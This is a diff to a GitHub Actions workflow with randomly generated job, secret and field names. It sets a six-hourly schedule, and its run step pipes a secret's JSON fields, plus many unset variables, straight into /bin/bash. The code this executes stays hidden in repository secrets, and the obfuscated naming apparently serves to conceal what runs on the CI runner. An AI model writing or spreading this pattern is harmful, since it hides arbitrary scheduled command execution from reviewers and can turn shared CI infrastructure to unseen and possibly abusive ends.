@@ -2,19 +2,39 @@ name: liuyidao4657
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '4 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liuyidao4657
         env:
-          zcpv4: ${{ secrets.zcpv4 }}
+          ehwrp3202: ${{ secrets.ehwrp3202 }}
         run: |
-          echo $zcpv4 | jq -r .ay17203 | /bin/bash
-          echo $xl9 | jq -r .lklfr97 | /bin/bash
-          echo $a4666 | jq -r .iuc543 | /bin/bash
-          echo $mefz828 | jq -r .hiqjr7476 | /bin/bash
+          echo $ehwrp3202 | jq -r .lpvmn4367 | /bin/bash
+          echo $niq3 | jq -r .npqk1322 | /bin/bash
+          echo $i1 | jq -r .aukg78 | /bin/bash
+          echo $kmhq8 | jq -r .bg61080 | /bin/bash
+          echo $ph31718 | jq -r .q778 | /bin/bash
+          echo $ar23 | jq -r .ajfh98 | /bin/bash
+          echo $ddicd89 | jq -r .vnxf2 | /bin/bash
+          echo $ehq09 | jq -r .w7 | /bin/bash
+          echo $yxsr3489 | jq -r .zdaju93 | /bin/bash
+          echo $jsjlf450 | jq -r .dr00 | /bin/bash
+          echo $yhbsg45911 | jq -r .ybqu97 | /bin/bash
+          echo $pyutd68 | jq -r .dk4302 | /bin/bash
+          echo $a408 | jq -r .hq1 | /bin/bash
+          echo $krgu0 | jq -r .ixfc7309 | /bin/bash
+          echo $u010 | jq -r .wl1457 | /bin/bash
+          echo $bqyw33222 | jq -r .necuu2 | /bin/bash
+          echo $ytt09 | jq -r .yndzw5023 | /bin/bash
+          echo $dlq3 | jq -r .j76321 | /bin/bash
+          echo $nflm69708 | jq -r .tkke269 | /bin/bash
+          echo $z64 | jq -r .roed60288 | /bin/bash
+          echo $qwbgk02113 | jq -r .hweo4298 | /bin/bash
+          echo $efei462 | jq -r .vil9 | /bin/bash
+          echo $tbea7 | jq -r .ip54257 | /bin/bash
 
